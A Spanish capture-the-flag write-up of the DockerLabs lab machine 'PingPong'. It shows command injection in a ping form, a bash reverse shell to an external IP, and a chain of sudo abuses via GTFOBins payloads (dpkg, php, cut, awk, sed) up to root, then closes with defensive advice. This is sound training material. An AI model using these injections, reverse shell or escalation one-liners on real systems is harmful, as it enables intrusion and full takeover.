# PingPong — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 23/06/2024  
**Técnicas:** Gobuster · Command Injection · Reverse Shell · sudo abuse · GTFOBins · Multi-user privilege escalation

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Explotación Ping Test — Command Injection](#3-explotación-ping-test--command-injection)
4. [Reverse Shell — usuario freddy](#4-reverse-shell--usuario-freddy)
5. [Escalada horizontal — usuario bobby](#5-escalada-horizontal--usuario-bobby)
6. [Escalada horizontal — usuario gladys](#6-escalada-horizontal--usuario-gladys)
7. [Escalada horizontal — usuario chocolatito](#7-escalada-horizontal--usuario-chocolatito)
8. [Escalada horizontal — usuario theboss](#8-escalada-horizontal--usuario-theboss)
9. [Escalada final a root](#9-escalada-final-a-root)
10. [Lección aprendida](#10-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh pingpong.tar
```

> IP asignada: `172.17.0.2`

Comprobamos conectividad:

```bash
ping -c 4 172.17.0.2
```

Realizamos un escaneo rápido:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
80/tcp open http
443/tcp open https
5000/tcp open upnp
```

Realizamos un escaneo profundo:

```bash
sudo nmap -p80,443,5000 -sCV -Pn 172.17.0.2
```

Resultado:

```text
80/tcp   Apache httpd 2.4.58
443/tcp  Apache httpd 2.4.58
5000/tcp Werkzeug httpd 3.0.1 (Python 3.12.3)
```

---

## 2. Enumeración web

Accedemos al servidor web principal:

```text
http://172.17.0.2
```

La página muestra únicamente el sitio por defecto de Apache.

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/javascript
/machine.php
```

La ruta `/machine.php` contiene un listado de máquinas.

El puerto `443` no muestra contenido relevante:

```text
Bad Request
```

---

## 3. Explotación Ping Test — Command Injection

Accedemos al servicio:

```text
http://172.17.0.2:5000
```

Encontramos una funcionalidad:

```text
Ping Test
```

Probamos inicialmente:

```text
172.17.0.2
```

La aplicación ejecuta correctamente el comando `ping`.

Intentamos inyección de comandos:

```text
172.17.0.2; ls
```

Resultado:

```text
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

La aplicación es vulnerable a **Command Injection**.

---

## 4. Reverse Shell — usuario freddy

Nos ponemos en escucha desde la máquina atacante:

```bash
sudo nc -lvnp 443
```

Generamos una reverse shell Bash:

```bash
;bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'
```

Obtenemos acceso remoto:

```bash
whoami
freddy
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(bobby) NOPASSWD: /usr/bin/dpkg
```

Consultamos GTFOBins para `dpkg`.

Payload utilizado:

```bash
sudo -u bobby /usr/bin/dpkg -l
!/bin/sh
```

Verificamos usuario:

```bash
whoami
bobby
```

---

## 5. Escalada horizontal — usuario bobby

Comprobamos nuevos privilegios:

```bash
sudo -l
```

Resultado:

```text
(gladys) NOPASSWD: /usr/bin/php
```

Consultamos GTFOBins para `php`.

Payload utilizado:

```bash
CMD="/bin/sh"
sudo -u gladys /usr/bin/php -r "system('$CMD');"
```

Verificamos usuario:

```bash
whoami
gladys
```

---

## 6. Escalada horizontal — usuario gladys

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(chocolatito) NOPASSWD: /usr/bin/cut
```

Exploramos directorios:

```bash
cd /opt
ls
```

Resultado:

```text
chocolatitocontraseña.txt
```

Utilizamos `cut` para leer el contenido:

```bash
LFILE=chocolatitocontraseña.txt
sudo -u chocolatito /usr/bin/cut -d "" -f1 "$LFILE"
```

Resultado:

```text
chocolatitopassword
```

Cambiamos de usuario:

```bash
su chocolatito
```

Contraseña:

```text
chocolatitopassword
```

Verificamos acceso:

```bash
whoami
chocolatito
```

---

## 7. Escalada horizontal — usuario chocolatito

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(theboss) NOPASSWD: /usr/bin/awk
```

Consultamos GTFOBins para `awk`.

Payload utilizado:

```bash
sudo -u theboss /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

Verificamos usuario:

```bash
whoami
theboss
```

---

## 8. Escalada horizontal — usuario theboss

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/sed
```

Consultamos GTFOBins para `sed`.

Payload utilizado:

```bash
sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
```

---

## 9. Escalada final a root

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 10. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Command Injection | Ejecución remota de comandos |
| Reverse Shell Bash | Acceso interactivo |
| sudo sobre dpkg/php/awk/sed | Escalada horizontal y vertical |
| Lectura insegura de archivos | Filtración de credenciales |
| Mala segmentación de privilegios | Compromiso total del sistema |

**Para defenderse:**

- Validar correctamente entradas en aplicaciones web.
- Evitar ejecución de comandos del sistema desde frontend.
- Limitar binarios peligrosos mediante sudo.
- Aplicar principio de mínimo privilegio.
- Monitorizar actividades sospechosas y escaladas internas.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
